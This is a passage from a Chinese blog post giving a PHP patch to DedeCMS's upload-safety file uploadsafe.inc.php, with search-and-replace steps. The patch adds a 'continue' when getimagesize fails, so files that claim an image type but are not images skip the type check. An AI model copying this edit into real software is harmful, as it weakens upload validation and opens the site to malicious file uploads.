</span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(<span class="keyword" style="font-weight:bold">empty</span>(${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">}))
{
<span class="indent">  </span>${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_size</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span>} =<span style="color:rgb(0,0,0)"> @filesize(<span class="variable" style="color:rgb(0,128,128)">$$_key</span>);
}
</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"><span style="color:rgb(0,128,0)"> 限制上传文件类型 </span><span style="color:rgb(0,128,0)">*/</span></span><span style="color:rgb(0,128,0)"></span><span style="color:rgb(0,0,0)">
<span class="variable" style="color:rgb(0,128,128)">$imtypes</span> </span>=<span style="color:rgb(0,0,0)"> <span class="keyword" style="color:rgb(51,51,51); font-weight:bold">array</span>
(
</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/pjpeg</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/jpeg</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/gif</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/png</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">, 
</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/xpng</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/wbmp</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span>, <span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">"</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">image/bmp</span><span style="color:rgb(128,0,0)">"</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">
);
</span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span>(in_array(strtolower(trim(${<!-- --><span class="variable" style="color:rgb(0,128,128)">$_key</span>.<span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">_type</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">})), <span class="variable" style="color:rgb(0,128,128)">$imtypes</span>))
{
<span class="indent">  </span><span class="variable" style="color:rgb(0,128,128)">$image_dd</span> </span>=<span style="color:rgb(0,0,0)"> @getimagesize(<span class="variable" style="color:rgb(0,128,128)">$$_key</span>);
<span class="indent">  </span></span><span style="color:rgb(0,0,255)"><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">if</span></span> (!<span style="color:rgb(0,0,0)">is_array(<span class="variable" style="color:rgb(0,128,128)">$image_dd</span>))
<span class="indent">  </span>{
<span class="indent">  </span><span class="indent">  </span><span class="keyword" style="color:rgb(51,51,51); font-weight:bold">exit</span>(</span><span style="color:rgb(128,0,0)"><span class="string" style="color:rgb(221,17,68)">'</span></span><span class="string" style="color:rgb(221,17,68)"><span style="color:rgb(128,0,0)">Upload filetype not allow !</span><span style="color:rgb(128,0,0)">'</span></span><span style="color:rgb(128,0,0)"></span><span style="color:rgb(0,0,0)">);
<span class="indent">  </span>}
}
</span><span style="color:rgb(0,128,0)"><span class="comment" style="color:rgb(153,153,136); font-style:italic">/*</span></span><span class="comment" style="color:rgb(153,153,136); font-style:italic"> <span style="color:rgb(0,128,0)">*/</span></span></code></pre> 
<br> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">      文件/include/uploadsafe.inc.php。</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">       有2个地方：</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">       1、搜索 ${$_key.'_size'} = @filesize($$_key);      }(大概在42,43行左右)</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">       替换成</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">           ${$_key.'_size'} = @filesize($$_key);</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">        } $imtypes = array("image/pjpeg", "image/jpeg", "image/gif", "image/png", "image/xpng", "image/wbmp", "image/bmp"); if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)) { $image_dd = @getimagesize($$_key); if($image_dd == false){ continue; } if (!is_array($image_dd)) { exit('Upload filetype not allow !'); } }    </p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">   2、搜索 $image_dd = @getimagesize($$_key);(大概在53行左右)</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">       替换成</p> 
<p style="margin-top:0px; margin-bottom:22px; padding-top:0px; padding-bottom:0px; color:rgb(51,51,51); font-family:'Microsoft Yahei',Simsun; font-size:17px; line-height:28px">            $image_dd = @getimagesize($$_key); if($image_dd == false){ continue; }     老规矩大红色地方标记了修改的地方，然后保存，接着备份原文件，比如文件名变为uploadsafe.inc.php.16.08.09.bak。然后上传修改好的文件即可。</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/0f8dc322913d96b1c340db30ef7b934e/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">android模拟器上网设置</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/8e3edde07c5afa1a779939fd35044fc4/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">正确性、健壮性、可靠性、效率、易用性、可读性（可理解性）、可扩展性、可复 用性、兼容性、可移植性</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>